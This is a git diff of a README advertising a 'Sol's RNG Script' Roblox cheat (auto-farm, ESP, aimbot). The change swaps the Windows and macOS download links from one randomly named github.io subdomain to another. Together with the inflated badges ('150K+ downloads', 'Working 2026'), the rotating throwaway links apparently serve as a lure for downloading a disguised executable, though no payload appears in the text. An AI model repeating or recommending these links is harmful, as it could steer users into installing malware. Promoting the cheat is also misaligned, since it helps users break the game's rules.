@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Sol's RNG Script](https://img.shields.io/badge/Download%20Sol's%20RNG%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://ojwfclvztvwo.github.io/winpkg2/)
+[![Download Sol's RNG Script](https://img.shields.io/badge/Download%20Sol's%20RNG%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://jaifcflcufqn.github.io/win-install/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Sol's RNG Script** for Sol's RNG — auto-farm, ESP, aimbot,
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ojwfclvztvwo.github.io/winpkg2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://jaifcflcufqn.github.io/win-install/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ojwfclvztvwo.github.io/mac-dist2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://jaifcflcufqn.github.io/mac-install/)
 
 </div>
 
